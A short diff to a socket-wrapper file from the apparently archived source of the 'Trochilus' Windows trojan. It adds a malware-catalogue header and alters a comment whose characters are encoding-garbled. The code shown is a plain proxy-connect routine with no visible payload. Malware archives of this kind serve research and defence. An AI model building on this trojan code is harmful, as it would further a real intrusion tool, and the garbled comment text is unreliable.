@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "winSocketEx.h"
 
 winSocketEx::winSocketEx( void ) {}
@@ -19,7 +30,7 @@ int winSocketEx::ProxyConnect( PPROXYCONNECTSTRUCT pPcs )
 	if( pPcs->szProxyIP == NULL || pPcs->iProxyPort == 0 || pPcs->usHostPort == 0 )
 		return PCERR_BADPARAM;
 
-	if( pPcs->uiProtocolVer != PROXY_V5 && pPcs->uiProtocolVer != PROXY_V4 )	// Ö±½ÓÁ¬½Ó
+	if( pPcs->uiProtocolVer != PROXY_V5 && pPcs->uiProtocolVer != PROXY_V4 )	// Ö±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 	{
 		if( winSocket::Connect( pPcs->ulHostIP, (u_short)ntohl(pPcs->usHostPort) ) != ERR_SUCCESS )
 			return PCERR_NOCONN;
